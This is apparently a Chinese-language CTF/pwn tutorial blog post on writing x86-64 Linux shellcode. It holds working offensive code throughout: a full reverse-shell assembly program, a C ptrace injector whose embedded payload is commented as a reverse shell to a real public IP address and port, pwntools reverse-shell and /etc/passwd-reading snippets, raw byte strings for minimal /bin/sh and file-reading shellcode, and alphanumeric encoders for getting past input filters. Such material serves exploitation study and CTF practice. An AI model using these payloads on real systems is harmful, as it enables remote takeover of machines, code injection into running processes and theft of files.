[{"title":"The Art of Shellcode","url":"/2025/12/01/The-Art-of-Shellcode/","content":"一、使用汇编器生成 shellcode\n特别参考佬的博客：\n1、The art of shellcode - LynneHuan - 博客园\n2、V3rdant’s Blog\n\n（一）汇编1、汇编格式section .text       ; 代码段开始global _start       ; 声明程序入口点_start:             ; 程序入口标签    ; 这里是你的代码    ; 每条指令占一行\n\n例如：\n; 最简单的退出程序 - 就像C语言的 return 0;section .text    global _start_start:    ; 系统调用：exit(0)    mov rax, 60    ; 60是exit的系统调用号    mov rdi, 0     ; 退出状态码为0    syscall        ; 执行系统调用\n\n2、系统调用固定格式; 系统调用模板mov rax, 系统调用号    ; 告诉系统要做什么mov rdi, 参数1        ; 第一个参数mov rsi, 参数2        ; 第二个参数  mov rdx, 参数3        ; 第三个参数syscall              ; 执行调用\n\n（二）shellcode 构建1、退出程序section .textglobal _start_start:    ; 方法1：直接赋值（可能产生空字节）    mov rax, 60    mov rdi, 0    syscall        ; 方法2：优化版本（避免空字节）    xor rax, rax    ; rax = 0    mov al, 60      ; rax的低8位=60 (al是rax的低8位)    xor rdi, rdi    ; rdi = 0    syscall\n\n2、输出字符串section .textglobal _start_start:    ; write(1, &quot;Hello\\n&quot;, 6)    mov rax, 1          ; write系统调用号=1    mov rdi, 1          ; 文件描述符1=标准输出    mov rsi, message    ; 字符串地址    mov rdx, 6          ; 字符串长度    syscall        ; exit(0)    mov rax, 60    xor rdi, rdi    syscallsection .datamessage: db &#x27;Hello&#x27;, 0x0A  ; 0x0A是换行符\n\n3、经典 execve(“&#x2F;bin&#x2F;sh”)section .textglobal _start_start:    ; execve(&quot;/bin/sh&quot;, NULL, NULL)        ; 清空寄存器    xor rsi, rsi    ; rsi = 0 (第二个参数)    push rsi        ; 字符串结尾的null字节        ; 把&quot;/bin/sh&quot;推入栈中    mov rdi, 0x68732f6e69622f2f  ; &quot;//bin/sh&quot;的十六进制    push rdi    mov rdi, rsp    ; rdi指向字符串地址 (第一个参数)        ; 设置参数数组    push rsi        ; argv[1] = NULL    push rdi        ; argv[0] = &quot;/bin/sh&quot;    mov rsi, rsp    ; rsi指向argv数组        ; 环境变量为NULL    xor rdx, rdx    ; rdx = 0 (第三个参数)        ; 执行execve    mov al, 59      ; execve系统调用号=59    syscall\n\n4、反弹 shell（1）创建 socketmov rax, 41    ; socket()mov rdi, 2     ; AF_INET (IPv4)mov rsi, 1     ; SOCK_STREAM (TCP)xor rdx, rdx   ; protocol=0syscallmov rdi, rax   ; 保存socket描述符\n\n（2）构建连接地址; 内存布局: [AF_INET][PORT][IP][0]push 0x0100007f    ; IP: 127.0.0.1push word 0x5c11   ; 端口: 4444 (0x115c)push word 0x2      ; AF_INET: 2\n\n（3）连接mov rsi, rsp    ; 指向地址结构mov rdx, 16     ; 地址长度mov rax, 42     ; connect()syscall\n\n（4）IO 重定向mov al, 33      ; dup2()mov rsi, 0      ; stdinsyscallmov rsi, 1      ; stdout  syscallmov rsi, 2      ; stderrsyscall\n\n（5）启动 shell; execve(&quot;/bin/sh&quot;, NULL, NULL)...\n\n（6）完整代码; reverse_shell.asm - 反弹shell到指定IP和端口section .text    global _start_start:    ; 第一步: 创建socket    ; socket(AF_INET, SOCK_STREAM, 0)    mov rax, 41         ; socket系统调用号=41    mov rdi, 2          ; AF_INET=2    mov rsi, 1          ; SOCK_STREAM=1    xor rdx, rdx        ; protocol=0    syscall        ; 保存socket描述符    mov rdi, rax        ; rdi现在保存socket fd        ; 第二步: 构建sockaddr_in结构    ; 结构体: &#123;AF_INET=2, port, IP&#125;    xor rax, rax    push rax            ; 填充8字节    mov dword [rsp-4], 0x0100007f  ; IP: 127.0.0.1 (本地测试)    mov word [rsp-6], 0x5c11       ; 端口: 4444 (0x115c)    mov word [rsp-8], 0x2          ; AF_INET=2    sub rsp, 8          ; 调整栈指针        ; 第三步: connect连接    ; connect(sockfd, &amp;serv_addr, 16)    mov rsi, rsp        ; 指向sockaddr结构    mov rdx, 16         ; 地址长度=16    mov rax, 42         ; connect系统调用号=42    syscall        ; 第四步: 重定向标准输入输出错误到socket    ; dup2(sockfd, 0) - 标准输入    mov rdi, [rsp+8]    ; 获取socket fd (之前保存在栈上)    xor rax, rax    mov al, 33          ; dup2系统调用号=33    xor rsi, rsi        ; stdin=0    syscall        ; dup2(sockfd, 1) - 标准输出    mov al, 33    mov rsi, 1          ; stdout=1    syscall        ; dup2(sockfd, 2) - 标准错误    mov al, 33    mov rsi, 2          ; stderr=2    syscall        ; 第五步: 执行/bin/sh    ; execve(&quot;/bin/sh&quot;, NULL, NULL)    xor rsi, rsi    push rsi            ; 字符串结尾的null        mov rdi, 0x68732f6e69622f2f  ; &quot;//bin/sh&quot;    push rdi    mov rdi, rsp        ; rdi指向&quot;/bin/sh&quot;        push rsi            ; argv[1]=NULL    push rdi            ; argv[0]=&quot;/bin/sh&quot;    mov rsi, rsp        ; rsi指向argv        xor rdx, rdx        ; envp=NULL    mov al, 59          ; execve系统调用号=59    syscall\n\n5、template 模板; ================================; Shellcode模板; 使用方法：; nasm -f elf64 template.asm -o template.o; ld template.o -o template; objcopy -O binary --only-section=.text template.o shellcode.bin; ================================section .text    global _start_start:    ; 在这里写你的代码    ; 使用下面的模式：        ; 1. 设置系统调用号    mov rax, 系统调用号        ; 2. 设置参数    mov rdi, 参数1    mov rsi, 参数2      mov rdx, 参数3        ; 3. 执行调用    syscall        ; 示例：退出程序    mov rax, 60    ; exit    mov rdi, 0     ; 状态码    syscall\n\n（三）生成机器码使用 nasm\n# 编译汇编文件nasm -f elf64 shellcode.asm -o shellcode.o# 链接为可执行文件（测试用）ld shellcode.o -o shellcode# 提取机器码objcopy -O binary --only-section=.text shellcode.o shellcode.bin# 查看机器码hexdump -C shellcode.binod -tx1 shellcode.bin# 反汇编验证objdump -d -M intel shellcode.o\n\n生成 c 语言数组形式：\n# 生成 C 数组格式xxd -i shellcode.bin\n\n二、使用 C 编译提取 shellcode通过示例说明：\n（一）shellcode.c#define __NR_read 0#define __NR_write 1#define __NR_exit 60#define __NR_wait4 61#define __NR_ptrace 101static inline long __syscall0(long n)&#123;\tunsigned long ret;\t__asm__ __volatile__ (&quot;syscall&quot; : &quot;=a&quot;(ret) : &quot;a&quot;(n) : &quot;rcx&quot;, &quot;r11&quot;, &quot;memory&quot;);\treturn ret;&#125;static inline long __syscall1(long n, long a1)&#123;\tunsigned long ret;\t__asm__ __volatile__ (&quot;syscall&quot; : &quot;=a&quot;(ret) : &quot;a&quot;(n), &quot;D&quot;(a1) : &quot;rcx&quot;, &quot;r11&quot;, &quot;memory&quot;);\treturn ret;&#125;static inline long __syscall2(long n, long a1, long a2)&#123;\tunsigned long ret;\t__asm__ __volatile__ (&quot;syscall&quot; : &quot;=a&quot;(ret) : &quot;a&quot;(n), &quot;D&quot;(a1), &quot;S&quot;(a2)\t\t\t\t\t\t  : &quot;rcx&quot;, &quot;r11&quot;, &quot;memory&quot;);\treturn ret;&#125;static inline long __syscall3(long n, long a1, long a2, long a3)&#123;\tunsigned long ret;\t__asm__ __volatile__ (&quot;syscall&quot; : &quot;=a&quot;(ret) : &quot;a&quot;(n), &quot;D&quot;(a1), &quot;S&quot;(a2),\t\t\t\t\t\t  &quot;d&quot;(a3) : &quot;rcx&quot;, &quot;r11&quot;, &quot;memory&quot;);\treturn ret;&#125;static inline long __syscall4(long n, long a1, long a2, long a3, long a4)&#123;\tunsigned long ret;\tregister long r10 __asm__(&quot;r10&quot;) = a4;\t__asm__ __volatile__ (&quot;syscall&quot; : &quot;=a&quot;(ret) : &quot;a&quot;(n), &quot;D&quot;(a1), &quot;S&quot;(a2),\t\t\t\t\t\t  &quot;d&quot;(a3), &quot;r&quot;(r10): &quot;rcx&quot;, &quot;r11&quot;, &quot;memory&quot;);\treturn ret;&#125;static inline long __syscall5(long n, long a1, long a2, long a3, long a4, long a5)&#123;\tunsigned long ret;\tregister long r10 __asm__(&quot;r10&quot;) = a4;\tregister long r8 __asm__(&quot;r8&quot;) = a5;\t__asm__ __volatile__ (&quot;syscall&quot; : &quot;=a&quot;(ret) : &quot;a&quot;(n), &quot;D&quot;(a1), &quot;S&quot;(a2),\t\t\t\t\t\t  &quot;d&quot;(a3), &quot;r&quot;(r10), &quot;r&quot;(r8) : &quot;rcx&quot;, &quot;r11&quot;, &quot;memory&quot;);\treturn ret;&#125;static inline long __syscall6(long n, long a1, long a2, long a3, long a4, long a5, long a6)&#123;\tunsigned long ret;\tregister long r10 __asm__(&quot;r10&quot;) = a4;\tregister long r8 __asm__(&quot;r8&quot;) = a5;\tregister long r9 __asm__(&quot;r9&quot;) = a6;\t__asm__ __volatile__ (&quot;syscall&quot; : &quot;=a&quot;(ret) : &quot;a&quot;(n), &quot;D&quot;(a1), &quot;S&quot;(a2),\t\t\t\t\t\t  &quot;d&quot;(a3), &quot;r&quot;(r10), &quot;r&quot;(r8), &quot;r&quot;(r9) : &quot;rcx&quot;, &quot;r11&quot;, &quot;memory&quot;);\treturn ret;&#125;static inline long __syscall_ret(unsigned long r)&#123;\tif (r &gt; -4096UL) &#123;\t\treturn -1;\t&#125;\treturn r;&#125;#define __scc(X) ((long) (X))#define __syscall1(n,a) __syscall1(n,__scc(a))#define __syscall2(n,a,b) __syscall2(n,__scc(a),__scc(b))#define __syscall3(n,a,b,c) __syscall3(n,__scc(a),__scc(b),__scc(c))#define __syscall4(n,a,b,c,d) __syscall4(n,__scc(a),__scc(b),__scc(c),__scc(d))#define __syscall5(n,a,b,c,d,e) __syscall5(n,__scc(a),__scc(b),__scc(c),__scc(d),__scc(e))#define __syscall6(n,a,b,c,d,e,f) __syscall6(n,__scc(a),__scc(b),__scc(c),__scc(d),__scc(e),__scc(f))#define __syscall7(n,a,b,c,d,e,f,g) __syscall7(n,__scc(a),__scc(b),__scc(c),__scc(d),__scc(e),__scc(f),__scc(g))#define __SYSCALL_NARGS_X(a,b,c,d,e,f,g,h,n,...) n#define __SYSCALL_NARGS(...) __SYSCALL_NARGS_X(__VA_ARGS__,7,6,5,4,3,2,1,0,)#define __SYSCALL_CONCAT_X(a,b) a##b#define __SYSCALL_CONCAT(a,b) __SYSCALL_CONCAT_X(a,b)#define __SYSCALL_DISP(b,...) __SYSCALL_CONCAT(b,__SYSCALL_NARGS(__VA_ARGS__))(__VA_ARGS__)#define __syscall(...) __SYSCALL_DISP(__syscall,__VA_ARGS__)#define syscall(...) __syscall_ret(__syscall(__VA_ARGS__))typedef unsigned char u8;typedef unsigned short u16;typedef unsigned int u32;typedef unsigned int uint;typedef unsigned long int u64;typedef unsigned long int size_t;#define NULL 0#define SUCCESS 0#define FAILURE 1static inline int write(int fd, void* buf, int sz)&#123;    return syscall(__NR_write, fd, buf, sz);&#125;static inline int exit(int status)&#123;    return syscall(__NR_exit, status);&#125;static inline int waitpid(long pid, long status, long option)&#123;    return syscall(__NR_wait4, pid, status, option, 0);&#125;static inline int ptrace(long req, long pid, long addr, long data)&#123;    return syscall(__NR_ptrace, req, pid, addr, data);&#125;static inline int strlen(const char * buf)&#123;    int l = 0;    while (*buf) &#123;        buf++;        l++;    &#125;    return l;&#125;static inline void puts(const char *s)&#123;    int r = write(1, s, strlen(s));    write(1, &quot;\\n&quot;, 1);    return r;&#125;#define die(s) \\puts (s); \\return FAILUREstruct user_regs_struct&#123;  unsigned long long int r15;  unsigned long long int r14;  unsigned long long int r13;  unsigned long long int r12;  unsigned long long int rbp;  unsigned long long int rbx;  unsigned long long int r11;  unsigned long long int r10;  unsigned long long int r9;  unsigned long long int r8;  unsigned long long int rax;  unsigned long long int rcx;  unsigned long long int rdx;  unsigned long long int rsi;  unsigned long long int rdi;  unsigned long long int orig_rax;  unsigned long long int rip;  unsigned long long int cs;  unsigned long long int eflags;  unsigned long long int rsp;  unsigned long long int ss;  unsigned long long int fs_base;  unsigned long long int gs_base;  unsigned long long int ds;  unsigned long long int es;  unsigned long long int fs;  unsigned long long int gs;&#125;;#define PTRACE_ATTACH 16#define PTRACE_DETACH 17#define PTRACE_GETREGS 12#define PTRACE_SETREGS 13#define PTRACE_PEEKDATA 2#define PTRACE_POKEDATA 5#define PTRACE_CONT 7#define PTRACE_INTERRUPT 0x4207// gcc -nostdlib -o test test.c -static -T ./link.lds -Os -w -Wl,-gc-sections &amp;&amp; strip ./teststatic inline int run2(int child, int has_attach)&#123;\tint res;\tif(!has_attach) &#123;\t\tif (ptrace(PTRACE_ATTACH, child, 0, 0) &lt; 0) &#123;\t\t\tdie(&quot;PTRACE_ATTACH&quot;);\t\t&#125;\t&#125;\tint status;\twaitpid(child, &amp;status, 0);\t// 保存当前状态\tstruct user_regs_struct save_pt_reg;\t// 保存被覆盖的 shellcode\t#define CODE_LEN 300\t// 反弹 shell 给 120.25.122.195 15680\tu8 buf[0x400] = &#123;144, 144, 144, 144, 106, 41, 88, 106, 2, 95, 106, 1, 94, 153, 15, 5, 106, 41, 88, 106, 2, 95, 106, 1, 94, 153, 15, 5, 72, 137, 197, 72, 184, 1, 1, 1, 1, 1, 1, 1, 1, 80, 72, 184, 3, 1, 60, 65, 121, 24, 123, 194, 72, 49, 4, 36, 106, 42, 88, 72, 137, 239, 106, 16, 90, 72, 137, 230, 15, 5, 72, 184, 1, 1, 1, 1, 1, 1, 1, 1, 80, 72, 184, 46, 103, 109, 96, 102, 1, 1, 1, 72, 49, 4, 36, 106, 2, 88, 72, 137, 231, 49, 246, 15, 5, 65, 186, 255, 255, 255, 127, 72, 137, 198, 106, 40, 88, 72, 137, 239, 153, 15, 5, 106, 116, 72, 184, 47, 102, 108, 97, 103, 46, 116, 120, 80, 106, 2, 88, 72, 137, 231, 49, 246, 15, 5, 65, 186, 255, 255, 255, 127, 72, 137, 198, 106, 40, 88, 72, 137, 239, 153, 15, 5, 72, 184, 1, 1, 1, 1, 1, 1, 1, 1, 80, 72, 184, 103, 46, 103, 109, 96, 102, 1, 1, 72, 49, 4, 36, 72, 184, 47, 104, 111, 109, 101, 47, 99, 116, 80, 106, 2, 88, 72, 137, 231, 49, 246, 15, 5, 65, 186, 255, 255, 255, 127, 72, 137, 198, 106, 40, 88, 72, 137, 239, 153, 15, 5, 104, 121, 117, 1, 1, 129, 52, 36, 1, 1, 1, 1, 72, 184, 102, 47, 102, 108, 97, 103, 46, 116, 80, 72, 184, 47, 104, 111, 109, 101, 47, 99, 116, 80, 106, 2, 88, 72, 137, 231, 49, 246, 15, 5, 65, 186, 255, 255, 255, 127, 72, 137, 198, 106, 40, 88, 72, 137, 239, 153, 15, 5, 72, 137, 239, 106, 3, 88, 15, 5, 204&#125;;\tuint save_opcode[CODE_LEN/4] = &#123;0&#125;;\tuint *opcode = (uint *)buf;\t//获取寄存器\tif (ptrace(PTRACE_GETREGS, child, NULL, &amp;save_pt_reg) &lt; 0) &#123;\t\tdie(&quot;PTRACE_GETREGS&quot;);\t&#125;\t// printf(&quot;GET RIP: 0x%lx\\n&quot;, save_pt_reg.rip);\t// 保存原有的 opcode\tfor (size_t i = 0; i &lt; CODE_LEN / 4; i++)\t&#123;\t\tsave_opcode[i] = ptrace(PTRACE_PEEKDATA, child, save_pt_reg.rip + i*4, NULL);\t&#125;\tputs(&quot;save!&quot;);\t// 注入 shellcode\tfor (size_t i = 0; i &lt; CODE_LEN / 4; i++)\t&#123;\t\tif (ptrace(PTRACE_POKEDATA, child, save_pt_reg.rip + i*4, opcode[i]) &lt; 0)\t\t&#123;\t\t\tdie(&quot;PTRACE_POKEDATA 1&quot;);\t\t&#125;\t&#125;\t// // 继续走\tif (ptrace(PTRACE_CONT, child, NULL, 0) &lt; 0) &#123;\t\tdie(&quot;PTRACE_CONT 1&quot;);\t&#125;\tputs(&quot;inject!&quot;);\twaitpid(child, &amp;status, 0);    ptrace(PTRACE_INTERRUPT, child, 0, 0);\t// 恢复\tfor (size_t i = 0; i &lt; CODE_LEN / 4; i++)\t&#123;\t\tif (ptrace(PTRACE_POKEDATA, child, save_pt_reg.rip + i*4, save_opcode[i]) &lt; 0)\t\t&#123;\t\t\tdie(&quot;PTRACE_POKEDATA 2&quot;);\t\t&#125;\t&#125;\tif (ptrace(PTRACE_SETREGS, child, NULL, &amp;save_pt_reg) &lt; 0) &#123;\t\tdie(&quot;PTRACE_SETREGS&quot;);\t&#125;\tif (ptrace(PTRACE_CONT, child, NULL, 0) &lt; 0) &#123;\t\tdie(&quot;PTRACE_CONT 2&quot;);\t&#125;\tputs(&quot;recover!&quot;);\tptrace(PTRACE_DETACH, child, 0, 0);\tputs(&quot;detach!&quot;);\treturn SUCCESS;&#125;int _start()&#123;\t// 第一个参数是 pid，根据需要修改即可\trun2(22093, 0);    exit(0);&#125;\n\n（二）编译link.lds\nENTRY(_start)SECTIONS&#123;  . = 0x8048000 + SIZEOF_HEADERS;  tiny : &#123; *(.text) *(.data) *(.rodata*) &#125;  /DISCARD/ : &#123; *(*) &#125;&#125;\n\n编译\ngcc -nostdlib -o test test.c -static -T ./link.lds -Os -w -Wl,-gc-sections &amp;&amp; strip ./test\n\n（三）python3 剥离 shellcodefrom pwncli import *res = os.system(&quot;gcc -nostdlib -o ezshellcode_exp ezshellcode_exp.c -static -T ./link.lds -Os -w -Wl,-gc-sections &amp;&amp; strip ./ezshellcode_exp&quot;)assert rer == 0eee = ELF(&quot;./ezshellcode_exp&quot;, checksec=False)ss = eee.get_section_by_name(&quot;tiny&quot;)\n\n三、C 语言内联汇编（一）基本格式asm [volatile] (     &quot;汇编指令1\\n\\t&quot;    &quot;汇编指令2\\n\\t&quot;    ...    : 输出操作数          // 可选    : 输入操作数          // 可选    : 被破坏的寄存器/内存  // 可选);\n\n或者使用 __asm__（和 asm 完全一样，更显式）：\n__asm__ volatile (    &quot;汇编指令&quot;    : 输出    : 输入    : 破坏);\n\n关键部分说明：\n\n\n\n部分\n说明\n\n\n\nasm 或 __asm__\n表示内联汇编代码块的开始\n\n\nvolatile\n（可选）告诉编译器不要优化此段汇编，保证按书写顺序执行\n\n\n“汇编指令”\n真正的汇编代码，比如 &quot;movl $1, %eax&quot;，多条指令用 \\n\\t 分隔\n\n\n输出操作数\n汇编代码 写入 的 C 变量，用 &quot;=r&quot; 等约束表示\n\n\n输入操作数\n汇编代码 读取 的 C 变量，用 &quot;r&quot; 等约束表示\n\n\n被破坏的部分\n告诉编译器本汇编修改了哪些寄存器或内存，防止优化错误，如 &quot;memory&quot; 或 &quot;eax&quot;\n\n\n（二）操作数约束说明在输入&#x2F;输出操作数中，我们使用 约束（constraints） 来告诉编译器如何处理 C 变量。\n\n\n\n约束\n含义\n\n\n\n&quot;r&quot;\n使用任意通用寄存器\n\n\n&quot;m&quot;\n操作数是内存地址\n\n\n&quot;i&quot;\n操作数是立即数（常数）\n\n\n&quot;g&quot;\n操作数可以是寄存器、内存或立即数\n\n\n&quot;=r&quot;\n输出操作数（写入到寄存器，然后存入变量）\n\n\n&quot;+r&quot;\n输入+输出操作数（读写）\n\n\n&quot;&amp;&quot;\n该操作数是临时寄存器，仅汇编内部使用\n\n\n&quot;memory&quot;\n告诉编译器本汇编代码修改了内存，防止乱序优化\n\n\n&quot;cc&quot;\n告诉编译器本汇编修改了标志寄存器（如零标志、进位标志等）\n\n\n（三）简单示例：使用输入和输出 —— C 变量与汇编交互1、demo：将两个整数相加，使用汇编实现，结果存回 C 变量#include &lt;stdio.h&gt;int main() &#123;    int a = 10;    int b = 20;    int result;    __asm__ volatile (        &quot;addl %[b_input], %[result_output]&quot;  // 汇编指令：result = result + b        : [result_output] &quot;=r&quot; (result)      // 输出操作数：result 放入寄存器，再写回变量        : [a_input] &quot;r&quot; (a),                 // 输入操作数 a          [b_input] &quot;r&quot; (b),                 // 输入操作数 b          [result_output] &quot;0&quot; (a)            // result 初始值为 a（可选，这里为了演示）    );    // 更清晰、更常用的写法如下：    a = 10;    b = 20;    result = a;  // 先让 result = a    __asm__ volatile (        &quot;addl %[b_val], %[result_val]&quot;        : [result_val] &quot;=r&quot; (result)        : [b_val] &quot;r&quot; (b), [result_val] &quot;0&quot; (result)    );    // 最推荐的标准、易读写法：    a = 10;    b = 20;    result = a;  // result = 10    __asm__ volatile (        &quot;addl %[b], %[result]&quot;        : [result] &quot;=r&quot; (result)        : [b] &quot;r&quot; (b), [result] &quot;0&quot; (result)    );    printf(&quot;result = %d\\n&quot;, result);  // 输出 30    return 0;&#125;\n\n\n\n\n部分\n说明\n示例\n\n\n\n汇编指令\n要执行的汇编代码，如 &quot;movl $1, %eax&quot;\n&quot;addl %[b], %[result]&quot;\n\n\n输出操作数\n汇编代码写入的 C 变量，格式：[name] &quot;约束&quot; (变量)\n[result] &quot;=r&quot; (result)\n\n\n输入操作数\n汇编代码读取的 C 变量，格式同上\n[b] &quot;r&quot; (b)\n\n\n被破坏部分\n告诉编译器哪些寄存器&#x2F;内存被修改了，如 &quot;memory&quot;、&quot;eax&quot;\n&quot;memory&quot;\n\n\n2、demo：读取内存地址 [rsp + 0x8] 的值（x86_64）#include &lt;stdio.h&gt;#include &lt;stdint.h&gt;int main() &#123;    uint64_t value;    __asm__ volatile (        &quot;movq 0x8(%%rsp), %[val]&quot;   // 从栈上读取 rsp + 0x8 处的 8 字节数据        : [val] &quot;=r&quot; (value)        // 输出到 C 变量 value        :        : &quot;memory&quot;                  // 通知编译器我们读取了内存    );    printf(&quot;[rsp + 0x8] = 0x%lx\\n&quot;, value);    return 0;&#125;\n\n四、pwn-shellcraft 模块生成 shellcodepwntools 的 shellcraft 是一个跨架构的 Shellcode 生成器。它按目标 操作系统&#x2F;CPU 架构 提供大量即用型模板（如 Linux x86&#x2F;x64&#x2F;ARM&#x2F;AArch64 等），既能直接输出 汇编文本，也能配合 asm() 输出 机器码，用于快速构造 execve(“&#x2F;bin&#x2F;sh”)、文件读写、网络通信、系统调用、栈&#x2F;寄存器操作 等常见利用原语。使用时通常通过 context(os &#x3D;…, arch &#x3D;…) 指定目标环境，或在命令行用 –context 指定；还可在命令行用 shellcraft -l 浏览可用模板、shellcraft &lt;arch&gt;.&lt;os&gt;.&lt;template&gt; 直接生成对应平台的代码\n（一）通用功能与常用模板\n通用与调试 **sh()**：\n生成触发 &#x2F;bin&#x2F;sh 的 Shellcode（最常见入口）。\n**cat(path, fd &#x3D; 1)**：打开文件并写到指定 文件描述符（默认 stdout）。\n**exit(code &#x3D; 0)**：以指定返回值退出。\n**nop()**：生成单字节 NOP。\n**breakpoint() &#x2F; trap()**：插入调试断点（常见为 int3 或 **raise(SIGTRAP)**）。\n**crash()**：触发崩溃（用于测试&#x2F;占位）。\n**infloop()**：无限循环（占位&#x2F;调试）。\n\n\n\n\n栈与数据搬运\n**push(value, …)、pushstr(string, …)、pushstr_array(reg, array, …)**：向栈压入立即数&#x2F;字符串&#x2F;指针数组（自动处理对齐与终止符）。\n**mov(dst, src)**：在汇编层面把 src 移入 dst（支持寄存器&#x2F;立即数，部分平台可自动规避 0x00&#x2F;0x0a）。\n**setregs(reg_context, …)、memcpy(dest, src, n)、xor(key, address, count)**：批量设寄存器、内存拷贝、按字节异或。\n\n\n文件与 I&#x2F;O\n**open(filename, flags, mode)、readn(fd, buf, nbytes)、write(fd, buf, nbytes)**：常用 open&#x2F;read&#x2F;write 封装（部分平台提供更高层如 cat&#x2F;cat2）。\n\n\n进程与权限\n**forkexit()**：fork 后父进程退出（让子进程成为孤儿）。\n**kill(pid, sig)、killparent()**：发送信号，或循环杀死父进程直至不可杀。\n\n\n网络（Linux 常见）\n**socket(network, proto)、connect(host, port, network)、dupio(sock)、dupsh(sock)**：创建套接字、连接、把套接字复制到 stdin&#x2F;stdout&#x2F;stderr，或在此基础上 spawn shell。\n**echo(string, sock &#x3D; 1)**：向指定 fd 写字符串。\n\n\n其它常用\n**sleep(seconds)**：基于 nanosleep 的休眠。\n**stage(fd &#x3D; 0, length &#x3D; None)**：从 fd 接收数据并迁移&#x2F;重定位 Shellcode 到新缓冲区（常用于第二阶段加载）。\nloader(address) &#x2F; **loader_append(data &#x3D; None)**：在指定地址加载静态 ELF 并跳转（或加载附加的 ELF 数据）\n\n\n\n（二）典型用法示例\n生成并获取机器码\n交互式获取汇编：\nprint(shellcraft.sh())\n\n\n获取机器码：\nprint(enhex(asm(shellcraft.sh())))\n\n\n\n\n指定架构&#x2F;系统\n命令行：shellcraft aarch64.linux.sh\n脚本：context(os &#x3D;’linux’, arch &#x3D;’aarch64’); asm(shellcraft.sh())\n\n\n文件读取并输出\nasm_cat &#x3D; shellcraft.cat(‘&#x2F;etc&#x2F;passwd’) + shellcraft.exit(0)\nprint(enhex(asm(asm_cat)))\n\n\n网络连接与反弹 Shell\nasm_conn &#x3D; shellcraft.connect(‘127.0.0.1’, 1337) + shellcraft.dupsh(‘x12’)\n发送 asm(asm_conn) 到目标后，nc -lvnp 1337 即可获得交互式 Shell\n\n\n\n（三）帮助文档shellcraft -husage: pwn shellcraft [-h] [-?] [-o file] [-f format] [-d] [-b] [-a] [-v AVOID] [-n] [-z] [-r] [--color] [--no-color] [--syscalls] [--address ADDRESS] [-l] [-s]                      [shellcode] [arg [arg ...]]Microwave shellcode -- Easy, fast and deliciouspositional arguments:  shellcode             The shellcode you want  arg                   Argument to the chosen shellcodeoptional arguments:  -h, --help            show this help message and exit  -?, --show            Show shellcode documentation  -o file, --out file   Output file (default: stdout)  -f format, --format format                        Output format (default: hex), choose from &#123;e&#125;lf, &#123;r&#125;aw, &#123;s&#125;tring, &#123;c&#125;-style array, &#123;h&#125;ex string, hex&#123;i&#125;i, &#123;a&#125;ssembly code, &#123;p&#125;reprocssed code,                        escape&#123;d&#125; hex string  -d, --debug           Debug the shellcode with GDB  -b, --before          Insert a debug trap before the code  -a, --after           Insert a debug trap after the code  -v AVOID, --avoid AVOID                        Encode the shellcode to avoid the listed bytes  -n, --newline         Encode the shellcode to avoid newlines  -z, --zero            Encode the shellcode to avoid NULL bytes  -r, --run             Run output  --color               Color output  --no-color            Disable color output  --syscalls            List syscalls  --address ADDRESS     Load address  -l, --list            List available shellcodes, optionally provide a filter  -s, --shared          Generated ELF is a shared library\n\n五、最短shellcode（一）getshell长度为22字节主要是通过cdq将rdx高位为0，减小了长度，另一种方法是通过mul r&#x2F;m64指令，实现清空rax和rdx\n\neax 高二位必须为0，一般是满足的\n\nxor \trsi, rsipush\trsi\tmov \trdi, 0x68732f2f6e69622fpush\trdipush\trsp\t\tpop\t    rdi\t\t\tmov \tal,\t59\tcdq\t\t\t\tsyscall\n\n48 31 f6             xor rsi, rsi\t56\t                 push rsi58 bf 2f 62 69 6e 2f mov rdi,\t0x68732f2f6e69622f;2f 73 6857                   push rdi54                   push rsp\t\t5f                   pop rdi     ;stack pointer to /bin//shb0 3b                mov al, 59\t ;sys_execve 66 b8 3b 00 mov ax,5999                   cdq \t   \t ;sign extend of eax0f 05                syscall\n\n// int0x622fbf4856f631480x545768732f2f6e690x050f993bb05f// bytes\\x48\\x31\\xf6\\x56\\x48\\xbf\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x57\\x54\\x5f\\xb0\\x3b\\x99\\x0f\\x05\n\n（二）ORW长度为0x28字节主要是通过异或实现了取代了mov减少长度\n\nrsp指向的地址必须是可用的\n存在NULL字符\n\n// rdx为写入数量mov rdx, 0x200push 0x67616c66mov rdi,rspxor esi,esi  #如果本来rsi=0，可以删掉这句mov eax,2syscallmov edi,eaxmov rsi,rspxor eax,eaxsyscallxor edi,2  mov eax,edisyscall  \n\n0x6800000200c2c7480x31e7894867616c660x050f00000002b8f60x0fc031e68948c7890x050ff88902f78305\\x48\\xc7\\xc2\\x00\\x02\\x00\\x00\\x68\\x66\\x6c\\x61\\x67\\x48\\x89\\xe7\\x31\\xf6\\xb8\\x02\\x00\\x00\\x00\\x0f\\x05\\x89\\xc7\\x48\\x89\\xe6\\x31\\xc0\\x0f\\x05\\x83\\xf7\\x02\\x89\\xf8\\x0f\\x05\n\n可指定地点\nshellcode = &quot;&quot;&quot;xor rdx,rdxmov dh, 0x2mov rdi,&#123;&#125;xor esi,esi  mov eax,2syscallmov rsi,rdimov edi,eaxxor eax,eaxsyscallxor edi,2mov eax,edisyscall&quot;&quot;&quot;.format(hex(target_addr + 0xb0))\n\n\n\n六、字符限制\n\n\n\nae64\nalpha3\n\n\n\nEncode x32 alphanumeric shellcode\n❌\n✔\n\n\nEncode x64 alphanumeric shellcode\n✔\n❌\n\n\nOriginal shellcode can contain zero bytes\n✔\n❌\n\n\nBase address register can contain offset\n✔\n\n\n\n（一）Alpha3限制只能使用字母或者数字alpha3使用:alpha3需要python2环境，所以先安装python2。可以选择架构、编码、限制的字符\nfrom pwn import *context.arch=&#x27;amd64&#x27;sc = b&quot;\\x48\\x31\\xf6\\x56\\x48\\xbf\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x57\\x54\\x5f\\x31\\xc0\\xb0\\x3b\\x99\\x0f\\x05&quot;with open(&quot;./sc.bin&quot;,&#x27;wb&#x27;) as f:    f.write(sc)# python2 ALPHA3.py x64 ascii mixedcase rdx --input=&quot;sc.bin&quot; &gt; out.bin \n\n\n\n（二）ae64AE64可以直接在python中导入，使用相对较为方便且限制较少\nfrom ae64 import AE64from pwn import *context.arch=&#x27;amd64&#x27;# get bytes format shellcodeshellcode = asm(shellcraft.sh())# get alphanumeric shellcodeenc_shellcode = AE64().encode(shellcode)print(enc_shellcode.decode(&#x27;latin-1&#x27;))\n\n\n\n（三）手动绕过Alphanumeric shellcode - NetSec\n\nx86_64 alphanumeric execve(‘&#x2F;bin&#x2F;sh’,null,null) - 111 